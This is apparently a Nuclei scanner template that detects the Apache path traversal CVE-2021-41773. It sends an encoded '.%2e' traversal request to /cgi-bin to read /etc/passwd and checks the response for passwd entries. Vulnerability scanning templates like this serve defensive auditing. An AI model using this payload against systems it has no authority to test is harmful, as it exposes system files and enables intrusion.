id: CVE-2021-41773

info:
  name: Apache path traversal detection
  author: "EBB"

requests:
  - method: GET
    path: 
      - "{{BaseURL}}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - ".+:x:[0-9]+:[0-9]+:.+:.+"
